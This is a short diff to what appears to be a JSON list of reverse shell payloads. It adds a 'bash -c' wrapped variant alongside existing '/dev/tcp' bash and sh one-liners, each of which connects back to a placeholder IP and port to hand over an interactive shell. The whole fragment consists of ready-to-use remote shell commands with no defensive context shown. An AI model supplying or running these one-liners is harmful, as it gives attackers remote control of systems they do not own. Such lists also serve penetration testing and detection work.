@@ -4,6 +4,9 @@
             "reverse": "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
         },
         {
+            "reverse": "bash -c \"bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\""
+        },
+        {
             "reverse": "exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0"
         }
     ],
